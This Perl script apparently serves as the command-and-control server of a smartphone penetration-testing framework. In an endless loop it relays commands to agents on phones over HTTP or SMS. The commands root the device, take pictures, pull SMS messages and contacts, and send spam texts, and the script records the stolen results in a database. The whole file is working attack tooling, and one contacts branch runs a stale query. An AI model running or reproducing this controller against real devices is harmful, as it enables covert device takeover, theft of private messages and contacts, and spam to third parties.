#!/usr/bin/perl
use DBI;
use Cwd;
use Expect;
use IO::Socket;
use FindBin qw($Bin);
use lib "$Bin/lib";
use SPF;
my %Variables = SPF::readconfig();
my $dbh = SPF::dbconnect(%Variables);
$Variables{"OS"} = $^O;
$ipaddress = $Variables{"IPADDRESS"};
$webserver = $Variables{"WEBSERVER"};
$path = $ARGV[0];
$key = $ARGV[1];
$id = $ARGV[2];
while(1)
	{
	$fullpath5 = $webserver . $path . "/putfunc";
	die "Couldn't find $fullpath5!" unless -r $fullpath5;
        open(PUTFILE, "<",$fullpath5) or die "Couldn't open $fullpath5 for reading! ($!)";
        $line= <PUTFILE>;
	close(PUTFILE);
	open(PUTFILE2, ">",$fullpath5) or die "Couldn't open $fullpath5 for writing! ($!)";;
	print PUTFILE2;
	close(PUTFILE2);
	@split = split(/ /, $line);
	if (@split[0] eq $key)
	{
		if (@split[1] eq "ROOT")
		{
			$delivery = @split[2];
			chomp($delivery);
			$command = $key . " " . "ROOT"; 
                	if ($delivery eq "HTTP")
                	{
                        	$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	sleep 60;
                       		$text = $webserver . $path . "/text.txt";
                       		open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                       		$line= <TEXTFILE>;
                       		if ($line eq "Root Succeeded")
                       		{
				$sql = $dbh->prepare("UPDATE data SET root = ? WHERE id = ?");
				$sql->execute("yes",$id);
                       		}
                       		close(TEXTFILE);
                       		open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
                       		print TEXTFILE2 "";
                       		close(TEXTFILE2);
			}
			if ($delivery eq "SMS")
                	{
                       		$modem = @split[3];
				chomp($modem);
				$sql = $dbh->prepare("SELECT path FROM modems WHERE id = ?");
				$results = $sql->execute($modem);
                        	@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];

			$sql = $dbh->prepare("SELECT controlkey FROM modems WHERE id = ?");
			$results2 = $sql->execute($modem);
                        	@rows = $sql->fetchrow_array();
                        	$key2 = @rows[0];

			$sql = $dbh->prepare("SELECT number FROM agents WHERE id = ?");
			$results = $sql->execute($id);
                        	@rows = $sql->fetchrow_array();
                        	$number2 = @rows[0];

                        	$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
		        	$control = $webserver . $path2 . "/getfunc";
                        	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                        	print CONTROLFILE $command2;
                        	close(CONTROLFILE);
                        	sleep 60;
                        	$text = $webserver . $path . "/text.txt";
                        	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                        	$line= <TEXTFILE>;
                        	if ($line eq "Root Succeeded")
                        	{
					$sql = $dbh->prepare("UPDATE data SET root = ? WHERE id = ?");
					$sql->execute("yes",$id);
                         	}
                        	close(TEXTFILE);
                        	open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
				print TEXTFILE2 "";
                        	close(TEXTFILE2);

			}

		
		}
		elsif (@split[1] eq "PICT")
		{
			$delivery = @split[2];
			chomp($delivery);
			$command = $key . " " . "PICT"; 
                	if ($delivery eq "HTTP")
                	{
                        	$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	sleep 30;
                        	$picturefile = $webserver . $path . "/picture.jpg";
                        	open(PICTURE, "<",$picturefile) or die "Couldn't open $picturefile for reading! ($!)";
                        	if (!(-z PICTURE))
                        	{
                                	$command = "cp" . " " . $picturefile . " " . ".";                               
                                	system($command);
                                	$picturedir = getcwd();
                                	$picture = $picturedir . "/" . "picture.jpg";
					$sql = $dbh->prepare("UPDATE data SET picture = ? WHERE id = ?");
					$sql->execute($picture,$id);
                                	close(PICTURE);
                                	open(PICTURE2, ">",$picturefile) or die "Couldn't open $picturefile for writing! ($!)";
                                	print PICTURE2 "";
                                	close(PICTURE2);
                        	}       
                      
                	}
                	if ($delivery eq "SMS")
                	{
                        	$modem = @split[3];
				chomp($modem);
				$sql = $dbh->prepare("SELECT path FROM modems WHERE id = ?");
				$results = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
				$sql = $dbh->prepare("SELECT controlkey from modems where id = ?");
				$results2 = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
				$sql = $dbh->prepare("SELECT number from agents where id = ?");
                                $results = $sql->execute($id);
                                @rows = $sql->fetchrow_array();
				$number2 = @rows[0];
                                $control = $webserver . $path2 . "/getfunc";
                                open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                $command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                print CONTROLFILE $command2;
                                close(CONTROLFILE);
                                sleep(60);
                                $picturefile = $webserver . $path . "/picture.jpg";
                                open(PICTURE, "<",$picturefile) or die "Couldn't open $picturefile for reading! ($!)";
                                if (!(-z PICTURE))
                                {
                                        $command = "cp" . " " . $picturefile . " " . ".";                               
                                        system($command);
                                        $picturedir = getcwd();
                                        $picture = $picturedir . "/" . "picture.jpg";
                                        $sql = $dbh->prepare("UPDATE data SET picture = ? WHERE id = ?");
					$sql->execute($picture,$id);
                                        close(PICTURE);
                                        open(PICTURE2, ">",$picturefile) or die "Couldn't open $picturefile for writing! ($!)";
                                        print PICTURE2 "";
                                        close(PICTURE2);
				}

			}
		}
		elsif (@split[1] eq "SMSS")
		{
			$deliverymethod = @split[2];
			$returnmethod = @split[3];
			chomp($returnmethod);
			 if ($returnmethod eq "SMS")
                	{
				$modem = @split[4];
				chomp($modem);	
                        	$sql = $dbh->prepare("SELECT path FROM modems WHERE id = ?");
                        	$results = $sql->execute($modem);
                        	@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];
                        	$command = $key . " " . "SMSS" . " " . $returnmethod; 
				if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                	print CONTROLFILE $command;
                                	close(CONTROLFILE);
                                	sleep 60;
                                	$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;
                                	$sql = $dbh->prepare("UPDATE data SET sms = ?  WHERE id = ?");
                                	$sql->execute($line,$id);
                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
				}
			 	if ($deliverymethod eq "SMS")
                         	{
					print "SMS";
                                	$sql = $dbh->prepare("SELECT controlkey FROM modems WHERE id = ?");
                                	$results2 = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];
                                	$sql = $dbh->prepare("SELECT number FROM agents WHERE id = ?");
                                	$results = $sql->execute($id);
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];
                                	$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                 	$control = $webserver . $path2 . "/getfunc";
                                	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                 	print CONTROLFILE $command2;
                                	close(CONTROLFILE);
                                        sleep 60;
                                	$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;
                                	$sql = $dbh->prepare("UPDATE data SET sms = ? WHERE id = ?");
                                	$sql->execute($line,$id);
                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
				}
			}
			 if ($returnmethod eq "HTTP")
                	{
                        	$command = $key . " " . "SMSS" . " " . "WEB";
                        	if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                	print CONTROLFILE $command;
                               	 	close(CONTROLFILE);
                                	sleep 30;
                                	$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;
                                	$sql = $dbh->prepare("UPDATE data SET sms = ? WHERE id = ?");
					close(TEXTFILE);
                                	open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2); 
	                               	$sql->execute($line,$id);
  				}
                        	if ($deliverymethod eq "SMS")
                        	{
                              		$modem = @split[4];
					chomp($modem);
                                	$sql = $dbh->prepare("SELECT path from modems where id = ?");
                                	$results = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$path2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT controlkey FROM modems WHERE id = ?");
                                	$results2 = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT number FROM agents WHERE  id = ?");
                                	$results = $sql->execute($id);
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];

                              		$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                 	$control = $webserver . $path2 . "/getfunc";
                                	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                 	print CONTROLFILE $command2;
                                	close(CONTROLFILE);

                                        sleep 60;

                                	$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;

                                	$sql = $dbh->prepare("UPDATE data SET sms = ? WHERE id = ?");
                                	$sql->execute($line,$id);

                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
				}
			}	

		}
		elsif (@split[1] eq "CONT")
		{
			$deliverymethod = @split[2];
                        $returnmethod = @split[3];
			chomp($returnmethod);
			if ($returnmethod eq "SMS")
			{
				$modem = @split[4];
				chomp($modem);
                        	$sql = $dbh->prepare("SELECT path FROM modems where id = ?");
                        	 $results = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
				$command = $key . " " . "CONT" . " " . $returnmethod; 
				if ($deliverymethod eq "HTTP")
				{
					$control = $webserver . $path . "/control";
					open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
       		        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
					sleep 60;
					$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;

					$insertquery = "UPDATE data SET contacts = ? WHERE id = ?";
					$sql->execute($line,$id);

					close(TEXTFILE);
					open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
					print TEXTFILE2 "";
					close(TEXTFILE2);

		
				}
				if ($deliverymethod eq "SMS")
				{
                                	$sql = $dbh->prepare("SELECT controlkey FROM modems WHERE id = ?");
                                	$results2 = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT number from agents where id=?");
                                	$results = $sql->execute($id);
                               		@rows = $sql->fetchrow_array();
                               		$number2 = @rows[0];

					$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
			 		$control = $webserver . $path2 . "/getfunc";
                       			open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
			 		print CONTROLFILE $command2;
                        		close(CONTROLFILE);
					sleep 60;
					$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
					$line= <TEXTFILE>;
					$sql = $dbh->prepare("UPDATE data SET contacts=? WHERE id=?");
					$sql->execute($line,$id);

					close(TEXTFILE);
					open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
					print TEXTFILE2 "";
					close(TEXTFILE2);

						
				}
		
			}
		
			if ($returnmethod eq "HTTP")
                	{
                        	$command = $key . " " . "CONT" . " " . "WEB";
                        	if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
					print CONTROLFILE $command;
                                	close(CONTROLFILE);
					sleep 30;
					$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                	$line= <TEXTFILE>;
					$sql = $dbh->prepare("UPDATE data SET contacts = ? WHERE id = ?");
					$sql->execute($line,$id);

					close(TEXTFILE);
					open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
					print TEXTFILE2 "";
					close(TEXTFILE2);
   				}
				if ($deliverymethod eq "SMS")
				{
					$modem = @split[4];
					chomp($modem);
                               		$sql = $dbh->prepare("SELECT path FROM modems WHERE id=?");
                                	$results = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$path2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT controlkey from modems where id=?");
                                	$results2 = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT number from agents where id=?");
                                	$results = $sql->execute($id);
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];

                                	$sql = $dbh->prepare("SELECT type from modems where id=?");
                                	$results = $sql->execute($modem);
                                	@rows = $sql->fetchrow_array();
                                	$type2 = @rows[0];

				 	if ($type2 eq "app")
                                	{
						$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
				 		$control = $webserver . $path2 . "/getfunc";
                        			open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
				 		print CONTROLFILE $command2;
                        			close(CONTROLFILE);
						sleep 60;
						$text = $webserver . $path . "/text.txt";
                                		open(TEXTFILE, "<",$text) or die "Couldn't open $text for reading! ($!)";
                                		$line= <TEXTFILE>;

						$sql = $dbh->prepare("UPDATE data SET contacts=? WHERE id=?");
						$sql->execute($line,$id);
						close(TEXTFILE);
						open(TEXTFILE2, ">",$text) or die "Couldn't open $text for writing! ($!)";
						print TEXTFILE2 "";
						close(TEXTFILE2);
					}

				}
			}

		}
		elsif (@split[1] eq "SPAM")
                {                   
			$modem = @split[2];
                	$sendnumber = @split[4];
			$deliverymethod = @split[3];
			$splitlength = @split;
			$end = $splitlength - 1;
			$sendmessage = @split[5];
			if ($end > 5)
			{
				for ($i = 6; $i<=$end; $i++)
				{
					$sendmessage .= " ";
					$sendmessage .= @split[$i]; 
				} 
			}
                	$command = $key . " " . "SPAM" . " " . $sendnumber .  " " .  $sendmessage; 
                	if ($deliverymethod eq "HTTP")
                	{
                       		$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                	}
                	if ($deliverymethod eq "SMS")
                	{
                                $sql = $dbh->prepare("SELECT path from modems where id=?");
                                $results = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];

                                $sql = $dbh->prepare("SELECT type from modems where id=?");
                                $results = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $type2 = @rows[0];

                                $sql = $dbh->prepare("SELECT controlkey from modems where id=?");
                                $results2 = $sql->execute($modem);
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];

                                $sql = $dbh->prepare("SELECT number from agents where id=?");
                                $results = $sql->execute($id);
                                @rows = $sql->fetchrow_array();
                                $number2 = @rows[0];

                                chomp($type2);
                                if ($type2 eq "app")
                                {       
                                        $control = $webserver . $path2 . "/getfunc";
                                        $command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                        open(CONTROLFILE, ">",$control) or die "Couldn't open $control for writing! ($!)";
                                        print CONTROLFILE $command2;
                                        close(CONTROLFILE);
                                }
                        }


                }       
                     
		
	}
}

